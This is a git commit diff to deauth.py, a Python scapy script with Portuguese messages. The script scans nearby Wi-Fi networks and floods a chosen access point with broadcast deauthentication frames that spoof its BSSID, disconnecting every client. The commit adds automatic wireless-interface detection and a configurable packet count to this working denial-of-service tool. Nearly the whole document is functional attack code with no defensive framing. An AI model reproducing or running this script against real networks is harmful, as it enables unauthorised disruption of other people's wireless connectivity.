d26017cf5b6c6de04eaefd821962a6934bf243cf
Hiago Bernardo <105991097+Brazoo@users.noreply.github.com>
2023-09-01 18:16:05 -0300

    Update

--- deauth.py
+++ deauth.py
@@ -1,9 +1,20 @@
 from scapy.all import *
 import os
 
-def get_wifi_networks(interface="wlan0mon"):
+def get_wifi_networks(interface=None):
     networks = []
     scan_result = []
+
+    if interface is None:
+        for iface_name in get_if_list():
+            iface = get_if_raw(iface_name)
+            if "wlan" in iface_name:
+                interface = iface_name
+                break
+
+        if interface is None:
+            print("Nenhuma interface Wi-Fi encontrada.")
+            return networks
 
     try:
         scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
@@ -18,13 +29,16 @@ def get_wifi_networks(interface="wlan0mon"):
                 networks.append((essid, bssid))
     return networks
 
-def deauth_all_devices(target_bssid, iface="wlan0mon"):
+def deauth_all_devices(target_bssid, iface=None, count=100):
+    if iface is None:
+        iface = conf.iface
+
     deauth_packet = (
         RadioTap()
         / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
         / Dot11Deauth()
     )
-    sendp(deauth_packet, iface=iface, count=100, inter=0.1)
+    sendp(deauth_packet, iface=iface, count=count, inter=0.1)
 
 if __name__ == "__main__":
     print("Escaneando redes WI-FI ao redor...")
@@ -32,6 +46,7 @@ if __name__ == "__main__":
     
     if wifi_networks:
         os.system("clear")
+        
         print("Redes WI-FI encontradas:")
         for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
             print(f"{idx}. ESSID: {essid}, BSSID: {bssid}")
